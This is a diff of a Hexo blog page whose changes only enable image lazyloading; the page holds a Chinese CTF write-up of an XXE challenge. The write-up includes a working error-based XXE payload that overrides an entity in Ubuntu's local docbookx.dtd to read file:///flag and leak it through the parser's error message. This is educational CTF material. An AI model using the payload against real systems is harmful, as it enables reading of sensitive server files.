@@ -21,7 +21,7 @@
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
     KEEP.hexo_config = {"hostname":"cv196082.gitee.io","root":"/","language":"zh-CN","path":"search.json"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/batman.jpeg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/batman.jpeg","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
     KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
   </script>
 <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
@@ -219,20 +219,60 @@
 
         <div class="article-content markdown-body">
             <p>拿到题目束手无策，扫描后无果直接看了wp，知道这是xxe</p>
-<p><img src="/images/image-20211018140805442.png" alt="image-20211018140805442"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211018140805442.png"
+                      alt="image-20211018140805442"
+                ></p>
 <p>江湖流传，有json的地方就有可能有xxe</p>
-<p><img src="/images/image-20211018141052075.png" alt="image-20211018141052075"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211018141052075.png"
+                      alt="image-20211018141052075"
+                ></p>
 <p>显示没有DTD，那就加一个</p>
-<p><img src="/images/image-20211018141328257.png" alt="image-20211018141328257"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211018141328257.png"
+                      alt="image-20211018141328257"
+                ></p>
 <p>没有声明这个element</p>
-<p><img src="/images/image-20211018141437748.png" alt="image-20211018141437748"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211018141437748.png"
+                      alt="image-20211018141437748"
+                ></p>
 <p>发现正常了,习惯性file协议看一下发现无果，看看可不可以引用内部文件</p>
-<p><img src="/images/image-20211018141844168.png" alt="image-20211018141844168"></p>
-<p><img src="/images/image-20211018142753777.png" alt="image-20211018142753777"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211018141844168.png"
+                      alt="image-20211018141844168"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211018142753777.png"
+                      alt="image-20211018142753777"
+                ></p>
 <p>不是标记语法，说被加载但是被断了，试试外部加载</p>
-<p><img src="/images/image-20211018143049820.png" alt="image-20211018143049820"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20211018143049820.png"
+                      alt="image-20211018143049820"
+                ></p>
 <p>同样不行。但是根据这里会显示完整的实体名字，在加上上面已经加载了内容那就可以综合利用起来</p>
-<h3 id="引用本地DTD文件"><a href="#引用本地DTD文件" class="headerlink" title="引用本地DTD文件"></a>引用本地DTD文件</h3><p><img src="/images/1562269900_5d1e58cc1d500.png!small" alt="xxe3.png"></p>
+<h3 id="引用本地DTD文件"><a href="#引用本地DTD文件" class="headerlink" title="引用本地DTD文件"></a>引用本地DTD文件</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/1562269900_5d1e58cc1d500.png!small"
+                      alt="xxe3.png"
+                ></p>
 <p>这是ubuntu 系统自带的/usr/share/yelp/dtd/docbookx.dtd的部分内容，内部定义了一些实体，我们只需要覆盖之后就行了。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message[</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;            </span><br><span class="line">        	&lt;!-- 这里呢，就是通过file协议读取flag --&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        	&lt;!-- 这里很好看出来，就是直接利用报错会显示完整的实体名字，把在上面读取的flag加载进去就行了 --&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
 
@@ -538,6 +578,8 @@
     <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
 
 
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
 
 
 <div class="post-scripts">
